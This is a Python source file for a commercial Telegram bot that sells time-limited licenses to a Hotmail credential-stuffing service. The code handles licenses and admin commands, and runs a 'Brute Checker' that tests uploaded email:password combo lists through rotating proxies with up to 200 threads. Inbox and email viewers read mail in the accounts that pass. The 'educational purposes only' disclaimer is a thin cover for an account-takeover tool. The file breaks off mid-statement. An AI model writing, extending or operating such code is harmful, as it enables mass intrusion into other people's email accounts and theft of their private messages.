"""Telegram command and callback handlers."""

from __future__ import annotations

import asyncio
import logging
import random
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional

import aiosqlite
from telegram import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardMarkup,
    Update,
)
from telegram.constants import ParseMode
from telegram.error import BadRequest, TelegramError
from telegram.ext import Application, ContextTypes

from database import (
    DB_PATH,
    add_reseller,
    extend_key,
    get_global_stats,
    get_key,
    get_user,
    get_user_stats,
    list_keys,
    log_job,
    mark_key_used,
    reset_user,
    revoke_key,
    save_key,
    save_user,
)
from hotmail_bot.async_workers import (
    async_check_hotmail,
    async_get_inbox,
    async_read_email,
    async_search_folders,
    async_search_inbox,
)
from hotmail_bot.core.checker import (
    activate_proxies_for_user,
    get_checker_settings as _get_checker_settings,
    is_awaiting_proxy_upload,
    mark_awaiting_proxy_upload,
    proxy_count,
    set_user_proxy_file,
    user_proxy_count,
)
from hotmail_bot.state import (
    checker_results,
    clear_job,
    enqueue_job,
    get_queued_job,
    inbox_folder,
    proxy_batch_lock,
    user_jobs,
)
from hotmail_bot.utils.helpers import (
    chunk_message,
    esc,
    format_expiry,
    generate_key,
    parse_combos,
    parse_duration,
)

logger = logging.getLogger(__name__)

CONFIG: dict = {}
HOTMAIL_CONFIG: dict = {}
PROXY_FILE = "proxies.txt"
SEARCH_KEYWORDS = ""


def get_checker_settings(user_id: int) -> Dict:
    return _get_checker_settings(user_id, HOTMAIL_CONFIG)


def is_owner(user_id: int) -> bool:
    return user_id in CONFIG["OWNER_IDS"]


async def check_license(user_id: int) -> tuple[bool, Optional[Dict]]:
    user = await get_user(user_id)
    if not user or not user["key"] or not user["expiry"]:
        return (False, user)
    try:
        expiry = datetime.fromisoformat(user["expiry"])
        if datetime.now() > expiry:
            return (False, user)
    except Exception:
        return (False, user)
    return (True, user)


INBOX_FOLDERS = {
    "inbox": "📥 Inbox",
    "junkemail": "🚫 Junk",
    "sentitems": "📤 Sent",
}


def get_inbox_folder(user_id: int) -> str:
    return inbox_folder.get(user_id, "inbox")


def set_inbox_folder(user_id: int, folder: str) -> None:
    if folder in INBOX_FOLDERS:
        inbox_folder[user_id] = folder


def effective_proxy_count(user_id: int) -> int:
    """User-uploaded proxies take precedence over global proxies.txt."""
    n = user_proxy_count(user_id)
    return n if n else proxy_count()


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command."""
    user = update.effective_user
    logger.info(f"User {user.id} ({user.username}) started the bot")

    # Check if user already has a valid license
    valid, user_data = await check_license(user.id)

    if valid and user_data:
        # User has valid license, show main menu directly
        expiry = user_data["expiry"]
        await show_main_menu(update, expiry)
        return

    # No valid license, show beautiful welcome with key entry
    is_owner_user = is_owner(user.id)

    welcome_text = """
<b>HOTMAIL ALL IN ONE</b>

Welcome! Choose a license plan to get started.

<b>TOOLS</b>
├ 📋 Hotmail Account Checker
├ 📬 Hotmail Inbox Viewer
├ ✉️ Hotmail Email Viewer &amp; Mail Access
└ 🌐 Country Sorter

<b>LICENSE PRICING</b>
├ $20 — 7 Days
├ $45 — 30 Days
├ $90 — 60 Days
├ $120 — 90 Days
└ $150 — Lifetime

<b>Purchase:</b> Contact the bot owner
"""

    keyboard = [
        [InlineKeyboardButton("🔑 Enter License Key", callback_data="enter_key")],
    ]

    # Add admin button for owners
    if is_owner_user:
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])

    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="HTML")


async def owner_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /owner command - show owner info."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ You are not the owner.")
        return

    owner_text = f"""
👑 Owner Information

Bot Name: {CONFIG['BOT_NAME']}
Owner ID: {CONFIG['OWNER_IDS'][0]}
Owner Username: {CONFIG['OWNER_USERNAME']}

This bot is verified and ready to use.
"""
    await update.message.reply_text(owner_text)


async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command - owner admin panel."""
    user = update.effective_user
    if not is_owner(user.id):
        if update.callback_query:
            await update.callback_query.edit_message_text("❌ You are not the owner.")
        else:
            await update.message.reply_text("❌ You are not the owner.")
        return

    keyboard = [
        [
            InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey"),
            InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys"),
        ],
        [
            InlineKeyboardButton("🔓 Revoke Key", callback_data="admin_revoke"),
            InlineKeyboardButton("⏰ Extend Key", callback_data="admin_extend"),
        ],
        [
            InlineKeyboardButton("👤 Reset User", callback_data="admin_reset"),
            InlineKeyboardButton("➕ Add Reseller", callback_data="admin_addreseller"),
        ],
        [
            InlineKeyboardButton("📊 Global Stats", callback_data="admin_stats"),
            InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
        ],
        [InlineKeyboardButton("🔙 Back", callback_data="menu_back")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    admin_text = f"""
👑 ADMIN PANEL

🔑 KEY MANAGEMENT
━━━━━━━━━━━━━━━━━━━━━━━━━━
• Generate new license keys
• List all keys with status
• Revoke compromised keys
• Extend key duration

👥 USER MANAGEMENT
━━━━━━━━━━━━━━━━━━━━━━━━━━
• Reset user licenses
• Add reseller permissions

📊 ANALYTICS
━━━━━━━━━━━━━━━━━━━━━━━━━━
• View global statistics
• Broadcast messages to all users

━━━━━━━━━━━━━━━━━━━━━━━━━━

Select an action below:
"""

    if update.callback_query:
        await update.callback_query.edit_message_text(admin_text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(admin_text, reply_markup=reply_markup)


async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /genkey command."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ You are not the owner.")
        return

    if not context.args:
        await update.message.reply_text(
            "Usage: /genkey <duration> [amount]\nExample: /genkey 1d 5\nDuration formats: 10m, 1h, 1d, 1w, 1mo, 1y, lifetime"
        )
        return

    duration_str = context.args[0]
    amount = int(context.args[1]) if len(context.args) > 1 else 1

    duration_seconds = parse_duration(duration_str)
    keys = []

    for _ in range(amount):
        key = generate_key()
        await save_key(key, duration_seconds, user.id)
        keys.append(key)

    key_list = "\n".join(keys)
    await update.message.reply_text(
        f"✅ Generated {amount} key(s) for {duration_str}:\n\n{key_list}",
        parse_mode=None,
    )


async def listkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /listkeys command."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ You are not the owner.")
        return

    keys = await list_keys()
    if not keys:
        await update.message.reply_text("No keys found.")
        return

    output = f"📋 All Keys (Total: {len(keys)})\n\n"
    for key in keys[:50]:  # Limit to 50
        status = "❌ Revoked" if key["revoked"] else "✅ Active"
        used = f"Used by {key['used_by']}" if key["used_by"] else "Unused"
        multiuse = " [Multi]" if key["multiuse"] else ""
        created = key.get('created_at', 'N/A')
        output += f"{key['key']}\n  Status: {status}\n  {used}{multiuse}\n  Created: {created}\n\n"

    if len(keys) > 50:
        output += f"... and {len(keys) - 50} more"

    chunks = chunk_message(output)
    for chunk in chunks:
        await update.message.reply_text(chunk)


async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /revoke command."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ You are not the owner.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /revoke <key>")
        return

    key_str = context.args[0]
    key = await get_key(key_str)
    if not key:
        await update.message.reply_text("❌ Key not found.")
        return

    await revoke_key(key_str)
    await update.message.reply_text(f"✅ Key {key_str} revoked.")


async def extend_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /extend command."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ You are not the owner.")
        return

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /extend <key> <duration>")
        return

    key_str = context.args[0]
    duration_str = context.args[1]

    key = await get_key(key_str)
    if not key:
        await update.message.reply_text("❌ Key not found.")
        return

    additional_seconds = parse_duration(duration_str)
    await extend_key(key_str, additional_seconds)
    await update.message.reply_text(f"✅ Extended key {key_str} by {duration_str}.")


async def resetuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /resetuser command."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ You are not the owner.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /resetuser <user_id>")
        return

    try:
        user_id = int(context.args[0])
        await reset_user(user_id)
        await update.message.reply_text(f"✅ Reset user {user_id}.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stats command."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ You are not the owner.")
        return

    stats = await get_global_stats()
    stats_text = f"""
📊 Global Statistics

👥 Total Users: {stats['total_users']}
🔑 Active Keys: {stats['active_keys']}
✅ Used Keys: {stats['used_keys']}
🔢 Total Checks: {stats['total_checks']}
"""
    await update.message.reply_text(stats_text)


async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /broadcast command."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ You are not the owner.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return

    message = " ".join(context.args)
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT user_id FROM users") as cursor:
            rows = await cursor.fetchall()
            sent = 0
            failed = 0
            for (user_id,) in rows:
                try:
                    await context.bot.send_message(user_id, message)
                    sent += 1
                except TelegramError:
                    failed += 1

    await update.message.reply_text(f"✅ Broadcast sent to {sent} users. Failed: {failed}")


async def addreseller_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /addreseller command."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text("❌ You are not the owner.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /addreseller <user_id>")
        return

    try:
        user_id = int(context.args[0])
        await add_reseller(user_id)
        await update.message.reply_text(f"✅ Added reseller status to {user_id}.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")


async def handle_enter_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle enter key button."""
    query = update.callback_query
    await query.answer()

    user = update.effective_user
    user_data = await get_user(user.id)

    if user_data and user_data["key"] and user_data["expiry"]:
        expiry = datetime.fromisoformat(user_data["expiry"])
        if datetime.now() < expiry:
            await query.edit_message_text(
                f"✅ You already have an active license!\n\nKey: {esc(user_data['key'])}\nExpires: {format_expiry(user_data['expiry'])}",
                parse_mode=ParseMode.MARKDOWN_V2,
            )
            return

    await query.edit_message_text(
        "🔑 Please paste your license key:",
        reply_markup=ReplyKeyboardMarkup([[KeyboardButton("Cancel")]], resize_keyboard=True, one_time_keyboard=True),
    )


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages."""
    user = update.effective_user
    text = update.message.text.strip()

    # License key redemption
    if text.startswith("MAIL-"):
        await handle_key_redemption(update, text)
        return

    # Check license first for other commands
    valid, user_data = await check_license(user.id)

    if not valid:
        if text.lower() != "cancel":
            await update.message.reply_text("❌ Invalid or expired license. Please enter a valid key.")
        return

    if is_awaiting_proxy_upload(user.id):
        await update.message.reply_text(
            "📤 Proxy mode: please upload a `.txt` file (one proxy per line), not plain text.",
            parse_mode="Markdown",
        )
        return

    # Handle feature requests (keep for compatibility with old reply keyboard)
    if text == "📧 Brute Checker":
        await handle_brute_checker(update, context)
    elif text == "📥 Inbox Viewer":
        await handle_inbox_viewer(update, context)
    elif text == "📩 Emails Viewer":
        await handle_read_email(update, context)
    elif text.lower() == "cancel":
        # Show menu
        expiry = user_data["expiry"] if user_data else ""
        await show_main_menu(update, expiry)
    else:
        # Route the input to whichever feature the user opened last
        feature = user_jobs.get(user.id, {}).get("feature")
        if feature == "inbox":
            await handle_inbox_fetch(update, context)
        elif feature == "read":
            await handle_email_read(update, context)
        elif feature == "checker" or ":" in text:
            await handle_combo_check(update, context)
        else:
            await update.message.reply_text("👋 Send /start to open the menu.")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded combo lists or proxy lists (.txt)."""
    user = update.effective_user
    document = update.message.document

    valid, _ = await check_license(user.id)
    if not valid and not is_owner(user.id):
        await update.message.reply_text("❌ Invalid or expired license. Please enter a valid key.")
        return

    if document.file_size and document.file_size > 20 * 1024 * 1024:
        await update.message.reply_text("❌ File too large. Maximum is 20 MB.")
        return

    notice = await update.message.reply_text("⏳ Downloading file...")

    try:
        tg_file = await document.get_file()
        content = await tg_file.download_as_bytearray()
        text = bytes(content).decode("utf-8", errors="ignore")
    except Exception as e:
        logger.error(f"Failed to download file from user {user.id}: {e}")
        await notice.edit_text("❌ Failed to download the file. Please try again.")
        return

    await notice.delete()

    if is_awaiting_proxy_upload(user.id):
        count = set_user_proxy_file(user.id, text)
        if count < 1:
            await update.message.reply_text(
                "❌ No valid proxy lines found. Use one proxy per line (comments with # allowed)."
            )
            return
        activate_proxies_for_user(user.id, PROXY_FILE)
        settings = get_checker_settings(user.id)
        settings["proxy"] = True
        mark_awaiting_proxy_upload(user.id, False)
        prompt_text, reply_markup = build_checker_panel(user.id)
        await update.message.reply_text(
            f"✅ Loaded {count} proxies for your session.\n\n{prompt_text}",
            reply_markup=reply_markup,
        )
        return

    if user.id not in user_jobs:
        user_jobs[user.id] = {"feature": "checker", "progress_msg": None, "queue": []}

    await handle_combo_check(update, context, text=text)


async def handle_key_redemption(update: Update, key_str: str):
    """Handle license key redemption."""
    user = update.effective_user
    logger.info(f"User {user.id} attempting to redeem key: {key_str}")

    key = await get_key(key_str)

    if not key:
        logger.warning(f"Key not found in database: {key_str}")
        await update.message.reply_text(f"❌ Invalid license key.\n\nKey: {key_str}\n\nMake sure you copied it exactly as shown.")
        return

    logger.info(f"Key found: {key}")

    if key["revoked"]:
        await update.message.reply_text("❌ This key has been revoked.")
        return

    # Check if key is single-use and already used
    if not key["multiuse"] and key["used_by"]:
        await update.message.reply_text("❌ This key has already been used.")
        return

    # Calculate expiry
    created_at = datetime.fromisoformat(key["created_at"])
    expiry = created_at + timedelta(seconds=key["duration_seconds"])

    logger.info(f"Key expiry calculated: {expiry}")

    # Save user
    await save_user(user.id, user.username or "", key_str, expiry.isoformat())

    # Mark key as used
    if not key["multiuse"]:
        await mark_key_used(key_str, user.id)

    # Show main menu
    await show_main_menu(update, expiry.isoformat(), is_new_activation=True)


async def safe_edit(query: CallbackQuery, text: str, reply_markup=None, parse_mode=None):
    """Edit a callback message, ignoring Telegram's 'message is not modified' error."""
    try:
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
    except BadRequest as exc:
        if "not modified" not in str(exc).lower():
            raise


async def show_main_menu(update: Update, expiry: str, is_new_activation: bool = False):
    """Show main menu with inline buttons."""
    # Returning to the menu means the user abandoned any pending feature input
    await clear_job(update.effective_user.id)

    user = update.effective_user
    user_data = await get_user(user.id)

    if is_new_activation:
        key = user_data.get("key", "N/A") if user_data else "N/A"
        owner = CONFIG['OWNER_USERNAME']
        discord = CONFIG['OWNER_DISCORD']

        welcome_text = f"""
✅ License Activated

 Key: <code>{key}</code>
⏳ Expires: {format_expiry(expiry)}
👤 User ID: <code>{user.id}</code>
📱 Username: @{user.username or 'N/A'}

⭐ Owner: {owner}

Choose a feature below.
"""
    else:
        welcome_text = f"""
✅ License Active

⏳ Expires: {format_expiry(expiry)}

Choose a feature below.
"""

    # Cool inline keyboard with categories
    keyboard = [
        [
            InlineKeyboardButton("🔐 Brute Checker", callback_data="menu_checker"),
            InlineKeyboardButton("📥 Inbox Viewer", callback_data="menu_inbox"),
        ],
        [
            InlineKeyboardButton("📩 Emails Viewer", callback_data="menu_read"),
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
        ],
        [
            InlineKeyboardButton("🔑 My License", callback_data="menu_license"),
            InlineKeyboardButton("❓ Help", callback_data="menu_help"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(update.callback_query, welcome_text, reply_markup=reply_markup, parse_mode="HTML")
    else:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="HTML")


def build_checker_panel(user_id: int):
    """Checker prompt + settings keyboard (proxy mode and thread count)."""
    settings = get_checker_settings(user_id)
    loaded = effective_proxy_count(user_id)

    mode = "🔌 Proxy" if settings["proxy"] else "🚀 No Proxy"
    if settings["proxy"]:
        mode += f" ({loaded} loaded)"

    kw = (settings.get("search_keywords") or SEARCH_KEYWORDS or "").strip()
    kw_line = f"🔎 Checker keywords: {kw}\n" if kw else ""

    text = f"""🔐 Brute Checker

⚙️ Mode: {mode}
⚡ Threads: {settings['threads']}
{kw_line}
📧 Send combos as email:password (one per line)
📎 Or upload a .txt combo file

🔌 Proxy mode: tap Upload Proxies or use {PROXY_FILE} on the server.

⚠️ Only check accounts you own or have permission to access."""

    keyboard = [
        [
            InlineKeyboardButton(
                ("✅ " if settings["proxy"] else "") + "🔌 Proxy",
                callback_data="ck_proxy",
            ),
            InlineKeyboardButton(
                ("✅ " if not settings["proxy"] else "") + "🚀 No Proxy",
                callback_data="ck_noproxy",
            ),
        ],
        [InlineKeyboardButton("📤 Upload Proxies (.txt)", callback_data="ck_upload_proxy")],
        [
            InlineKeyboardButton(
                ("✅ " if settings["threads"] == t else "") + f"⚡ {t}",
                callback_data=f"ck_t{t}",
            )
            for t in (10, 25, 50)
        ],
        [
            InlineKeyboardButton(
                ("✅ " if settings["threads"] == t else "") + f"⚡ {t}",
                callback_data=f"ck_t{t}",
            )
            for t in (100, 200)
        ],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")],
    ]
    return text, InlineKeyboardMarkup(keyboard)


async def handle_brute_checker(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle brute checker feature."""
    user = update.effective_user

    # Check if user already has a job running
    started = await enqueue_job(user.id, "checker", context)
    if not started:
        message = "⏳ You already have a task open.\n\nFinish it, or send /start to switch."
        if update.callback_query:
            await update.callback_query.edit_message_text(message)
        else:
            await update.message.reply_text(message)
        return

    prompt_text, reply_markup = build_checker_panel(user.id)

    if update.callback_query:
        await update.callback_query.edit_message_text(prompt_text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(prompt_text, reply_markup=reply_markup)


async def handle_checker_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle proxy mode / thread count buttons on the checker panel."""
    query = update.callback_query
    user = update.effective_user

    if not is_owner(user.id):
        valid, _ = await check_license(user.id)
        if not valid:
            await query.answer("❌ Invalid or expired license. Please enter a valid key.", show_alert=True)
            return

    data = query.data
    settings = get_checker_settings(user.id)

    if data == "ck_stop":
        job = user_jobs.get(user.id)
        cancel = job.get("cancel") if job else None
        if cancel is not None and not cancel.is_set():
            cancel.set()
            await query.answer("⛔ Stopping the check...")
        else:
            await query.answer("Nothing is running.")
        return

    if data.startswith("ck_dl_"):
        kind = data[len("ck_dl_"):]
        stored = checker_results.get(user.id) or {}
        items = stored.get(kind) or []
        if not items:
            await query.answer("No results to download.", show_alert=True)
            return
        await query.answer()
        fname = f"{kind}_{user.id}_{stored.get('stamp', '')}.txt"
        fpath = Path(fname)
        fpath.write_text("\n".join(items), encoding="utf-8")
        try:
            with fpath.open("rb") as fh:
                await query.message.reply_document(document=fh, filename=fname)
        except Exception as e:
            logger.error(f"Failed to send {kind} file: {e}")
        finally:
            try:
                fpath.unlink()
            except OSError:
                pass
        return

    if data == "ck_upload_proxy":
        mark_awaiting_proxy_upload(user.id, True)
        await query.answer("Send a .txt proxy file in chat")
        await query.message.reply_text(
            "📤 Upload a `.txt` file with one proxy per line.\n"
            "Formats: `ip:port`, `user:pass@ip:port`, `socks5://host:port`\n"
            "Lines starting with `#` are ignored.",
            parse_mode="Markdown",
        )
        return

    if data == "ck_proxy":
        if not effective_proxy_count(user.id):
            mark_awaiting_proxy_upload(user.id, True)
            await query.answer("No proxies — upload a file or add proxies.txt", show_alert=True)
            await query.message.reply_text(
                f"No proxies loaded. Upload a `.txt` file here or add `{PROXY_FILE}` on the server, "
                "then enable Proxy mode again.",
                parse_mode="Markdown",
            )
            return
        activate_proxies_for_user(user.id, PROXY_FILE)
        settings["proxy"] = True
        await query.answer("🔌 Proxy mode ON")
    elif data == "ck_noproxy":
        settings["proxy"] = False
        await query.answer("🚀 No-proxy mode ON")
    elif data.startswith("ck_t"):
        settings["threads"] = int(data.replace("ck_t", ""))
        await query.answer(f"⚡ {settings['threads']} threads")
    else:
        await query.answer()

    prompt_text, reply_markup = build_checker_panel(user.id)
    await safe_edit(query, prompt_text, reply_markup=reply_markup)


def build_inbox_panel(user_id: int):
    """Inbox prompt + folder picker keyboard."""
    folder = get_inbox_folder(user_id)
    label = INBOX_FOLDERS.get(folder, "📥 Inbox")

    text = f"""📥 Inbox Viewer

📂 Folder: {label}

Send one of these:
• email:password — latest messages
• email:password keyword — search all folders

💡 Tap a folder below to switch. Use the UID with the Emails Viewer to read a message.
"""

    keyboard = [
        [
            InlineKeyboardButton(
                ("✅ " if folder == fid else "") + name,
                callback_data=f"menu_inbf_{fid}",
            )
            for fid, name in INBOX_FOLDERS.items()
        ],
        [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")],
    ]
    return text, InlineKeyboardMarkup(keyboard)


async def handle_inbox_viewer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle inbox viewer feature."""
    user = update.effective_user

    # Re-rendering from the checker panel or a folder tap must not hit the queue
    if update.callback_query and user_jobs.get(user.id, {}).get("feature") == "inbox":
        prompt_text, reply_markup = build_inbox_panel(user.id)
        await update.callback_query.edit_message_text(prompt_text, reply_markup=reply_markup)
        return

    started = await enqueue_job(user.id, "inbox", context)
    if not started:
        message = "⏳ You already have a task open.\n\nFinish it, or send /start to switch."
        if update.callback_query:
            await update.callback_query.edit_message_text(message)
        else:
            await update.message.reply_text(message)
        return

    prompt_text, reply_markup = build_inbox_panel(user.id)

    if update.callback_query:
        await update.callback_query.edit_message_text(prompt_text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(prompt_text, reply_markup=reply_markup)


async def handle_read_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle read email feature."""
    user = update.effective_user

    started = await enqueue_job(user.id, "read", context)
    if not started:
        message = "⏳ You already have a task open.\n\nFinish it, or send /start to switch."
        if update.callback_query:
            await update.callback_query.edit_message_text(message)
        else:
            await update.message.reply_text(message)
        return

    prompt_text = "📩 Send email:password and UID to read email:\n\nFormat: email:password UID"

    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await update.callback_query.edit_message_text(prompt_text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(prompt_text, reply_markup=reply_markup)


async def handle_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle menu button clicks."""
    query = update.callback_query
    await query.answer()

    user = update.effective_user
    action = query.data

    # "Back to Menu" must always work, regardless of license state
    if action == "menu_back":
        user_data = await get_user(user.id)
        expiry = user_data["expiry"] if user_data and user_data.get("expiry") else "2099-01-01T00:00:00"
        await show_main_menu(update, expiry)
        return

    # Check license first (owners always have access)
    if not is_owner(user.id):
        valid, user_data = await check_license(user.id)
        if not valid:
            await query.edit_message_text("❌ Your license has expired or is invalid.")
            return
    else:
        user_data = await get_user(user.id)

    expiry = user_data["expiry"] if user_data and user_data.get("expiry") else "2099-01-01T00:00:00"

    if action == "menu_checker":
        await handle_brute_checker(update, context)
    elif action.startswith("menu_inbf_"):
        set_inbox_folder(user.id, action[len("menu_inbf_"):])
        panel_text, panel_markup = build_inbox_panel(user.id)
        await query.edit_message_text(panel_text, reply_markup=panel_markup)
    elif action == "menu_inbox":
        await handle_inbox_viewer(update, context)
    elif action == "menu_read":
        await handle_read_email(update, context)
    elif action == "menu_stats":
        # Handle stats directly here to avoid callback issues
        stats = await get_user_stats(user.id)
        if not stats:
            stats_text = "📊 No stats yet."
        else:
            stats_text = "📊 Your Statistics\n\n"
            for feature, data in stats.items():
                stats_text += f"{feature}: {data['total']} total in {data['runs']} runs\n"
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(stats_text, reply_markup=reply_markup)
    elif action == "menu_license":
        # Handle license directly here
        user_data = await get_user(user.id)
        if not user_data or not user_data["key"]:
            license_text = "❌ No license found."
        else:
            key = user_data['key']
            expiry = user_data['expiry']
            expiry_formatted = format_expiry(expiry)
            is_reseller = 'Yes' if user_data.get('is_reseller') else 'No'
            first_seen = user_data.get('first_seen', 'N/A')
            username = user_data.get('username', 'N/A')

            try:
                expiry_date = datetime.fromisoformat(expiry)
                now = datetime.now()
                if expiry_date > now:
                    delta = expiry_date - now
                    days_remaining = delta.days
                    hours_remaining = delta.seconds // 3600
                    time_remaining = f"{days_remaining}d {hours_remaining}h"
                else:
                    time_remaining = "EXPIRED"
            except:
                time_remaining = "Unknown"

            license_text = f"""
🔑 Your License Information

━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 License Details
━━━━━━━━━━━━━━━━━━━━━━━━━━

🔑 License Key: {key}
⏰ Expires: {expiry_formatted}
⌛ Time Remaining: {time_remaining}
👤 User ID: {user.id}
📱 Username: @{username if username != 'N/A' else 'N/A'}
🏷️ Reseller: {is_reseller}
📅 First Seen: {first_seen}

━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(license_text, reply_markup=reply_markup)
    elif action == "menu_help":
        # Handle help directly here
        help_text = f"""
❓ Help

📧 Brute Checker: Validate email:password combos
  Send combos in format email:password (one per line)

📥 Inbox Viewer: Fetch latest emails
  Send email:password to get the selected folder (Inbox / Junk / Sent)
  Send email:password keyword to search all folders

📩 Emails Viewer: Read specific email
  Send email:password UID to read email body

📊 My Stats: View your usage statistics

🔑 My License: View your license info

⚠️ IMPORTANT: This tool is for EDUCATIONAL PURPOSES ONLY.
Only check accounts you own or have permission to access.

Need help? Contact owner: {CONFIG['OWNER_USERNAME']}
"""
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(help_text, reply_markup=reply_markup)
    elif action == "menu_back":
        await show_main_menu(update, expiry)


async def handle_combo_check(update: Update, context: ContextTypes.DEFAULT_TYPE, text: Optional[str] = None):
    """Handle combo checking. `text` may be supplied for uploaded files."""
    user = update.effective_user
    if text is None:
        text = update.message.text.strip()
    else:
        text = text.strip()

    combos = parse_combos(text)

    if not combos:
        await update.message.reply_text("❌ No valid combos found. Use format `email:password`")
        await clear_job(user.id)
        return

    # Process combos concurrently — speed scales with the selected thread count,
    # using the same proxy rotation as the original checker.
    settings = get_checker_settings(user.id)
    use_proxy = bool(settings["proxy"])
    if use_proxy:
        loaded = activate_proxies_for_user(user.id, PROXY_FILE)
        if loaded < 1:
            await update.message.reply_text(
                "❌ Proxy mode is on but no proxies are loaded. Upload proxies or disable proxy mode."
            )
            await clear_job(user.id)
            return

    threads = max(1, int(settings["threads"]))
    total = len(combos)
    mode_label = "🔌 Proxy" if use_proxy else "🚀 No Proxy"
    search_q = (settings.get("search_keywords") or SEARCH_KEYWORDS or "").strip() or None

    hits = []
    twofa = []
    locked = []
    bad = []
    errors = []

    pool = ThreadPoolExecutor(max_workers=threads)
    done = 0
    cancel = asyncio.Event()

    def progress_text() -> str:
        return (
            f"⏳ Checking {total} combos...\n"
            f"Progress: {done}/{total} · ✅ {len(hits)} · 🔐 {len(twofa)} 2FA · "
            f"🔒 {len(locked)} locked · ❌ {len(bad)} bad · ⚠️ {len(errors)} err\n"
            f"⚙️ {mode_label} · ⚡ {threads} threads"
        )

    stop_kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("⛔ Stop Checking", callback_data="ck_stop")]]
    )

    # Send initial progress message
    progress_msg = await update.message.reply_text(progress_text(), reply_markup=stop_kb)
    if user.id not in user_jobs:
        user_jobs[user.id] = {"feature": "checker", "progress_msg": None, "queue": []}
    user_jobs[user.id]["progress_msg"] = progress_msg
    user_jobs[user.id]["cancel"] = cancel

    async def refresher():
        """Refresh the live stats every 3 seconds."""
        while True:
            await asyncio.sleep(3)
            try:
                await progress_msg.edit_text(progress_text(), reply_markup=stop_kb)
            except Exception:
                pass

    async def run_one(combo: str):
        nonlocal done
        try:
            if not use_proxy and threads > 25:
                await asyncio.sleep(random.uniform(0.05, 0.35))
            email, password = combo.split(":", 1)
            result = await async_check_hotmail(
                email, password, pool, use_proxy, search_q
            )

            category = result.get("category") or "error"
            reason = result.get("reason", "")
            info = result.get("info") or {}

            if category == "valid":
                inbox_count = info.get("inbox", 0)
                total_count = info.get("total", inbox_count)
                kw_match = info.get("kw_match", 0)
                kw_details = info.get("kw_details") or {}
                location = info.get("location") or "Unknown"

                detail = f"{email}:{password} | Inbox: {inbox_count} | Loc: {location}"
                if total_count and total_count != inbox_count:
                    detail += f" | Total: {total_count}"
                if kw_match:
                    detail += f" | Keywords: {kw_match}"
                if kw_details:
                    if isinstance(kw_details, dict):
